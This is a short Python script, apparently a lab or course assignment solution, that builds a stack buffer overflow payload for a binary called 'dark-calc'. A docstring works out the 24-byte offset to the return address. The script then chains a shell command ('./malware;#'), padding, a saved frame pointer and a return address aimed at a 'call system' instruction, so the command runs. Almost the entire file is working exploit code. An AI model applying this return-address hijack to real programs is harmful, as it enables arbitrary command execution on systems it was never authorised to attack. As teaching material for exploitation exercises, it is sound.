#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Stack layout inside input():
    [rbp-0x10] expression, 16 bytes   <- our command string starts here
    [rbp+0x00] saved rbp,  8 bytes
    [rbp+0x08] return address, 8 bytes
so the offset from the buffer to the return address is 16 + 8 = 24.

input() also does strcpy(command_buf, expression) (command_buf = 0x6030d0),
so our raw input ends up in the global buffer that eval() later passes to
system(). We jump straight to 0x401a6b (mov edi,0x6030d0; call system) to
skip the echo $(( )) wrapping.
"""
import sys

COMMAND = b"./malware;#"                # 11 bytes: the command + shell comment marker
FILL    = b"A" * 5                      # 5 bytes: pad the 16-byte expression buffer
SAVED_RBP = 0x721000800ff0              # main's saved-rbp slot, keeps the return chain sane
RET_ADDR  = 0x401a6b                    # eval(): mov edi,0x6030d0; call system

payload  = COMMAND + FILL               # 16 bytes -> fills expression[]
payload += SAVED_RBP.to_bytes(8, "little")   # 8 bytes -> saved rbp
payload += RET_ADDR.to_bytes(8, "little")    # 8 bytes -> return address

sys.stdout.buffer.write(payload)
